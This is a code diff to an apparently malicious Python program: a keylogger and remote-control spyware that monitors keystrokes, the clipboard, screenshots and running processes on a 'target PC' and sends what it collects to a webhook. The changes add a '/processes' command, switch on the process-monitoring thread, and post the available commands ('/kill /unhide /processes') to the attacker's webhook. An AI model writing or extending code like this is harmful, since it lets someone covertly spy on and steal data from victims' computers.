@@ -122,6 +122,12 @@ def on_release(key):
             send_to_webhook("Launching again on restart.")
             return False
 
+        elif "/processes" in current_clipboard:
+            try:
+                process_thread.start()
+            except:
+                send_to_webhook("Error finding processes.")
+
         elif "/unhide" in current_clipboard:
             try:
                 unhide()
@@ -212,7 +218,7 @@ def screenshot():
         print(f"Deleted {filename}")
         send_to_webhook(f"Deleted {filename} on target PC")
 
-        time.sleep(3) 
+        time.sleep(5)
 
 
 # Run kill.bat file at the start
@@ -232,10 +238,9 @@ disk_info = psutil.disk_usage('/')
 
 send_to_webhook(f"CPU cores: {cpu_count}")
 send_to_webhook(f"CPU percent: {cpu_percent}%")
-send_to_webhook(
-    f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
-send_to_webhook(
-    f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
+send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
+send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
+send_to_webhook("Commands: /kill /unhide /processes")
 
 # Start all monitoring threads
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
@@ -246,7 +251,6 @@ process_thread = threading.Thread(target=monitor_processes, daemon=True)
 keystroke_thread.start()
 clipboard_thread.start()
 screenshot_thread.start()
-#process_thread.start()
 
 # Set up the keyboard listener
 try:
